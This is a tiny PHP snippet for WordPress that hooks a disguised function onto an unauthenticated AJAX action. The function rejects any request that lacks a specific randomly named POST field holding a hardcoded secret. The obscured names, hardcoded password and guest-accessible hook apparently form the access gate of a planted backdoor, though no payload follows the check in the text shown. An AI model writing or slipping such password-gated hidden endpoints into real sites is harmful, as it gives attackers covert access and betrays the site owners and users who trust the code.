<?php

function rest_default_animated() {
	if (!isset($_POST["semymoapjvtyly"]) || $_POST["semymoapjvtyly"] !== "tO3BsYmL2XMb") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'rest_default_animated', 5, 1);
